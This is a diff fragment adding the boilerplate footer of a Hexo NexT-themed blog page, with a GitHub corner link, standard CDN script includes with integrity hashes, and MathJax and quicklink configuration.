+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/09/23/Chronos%201/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
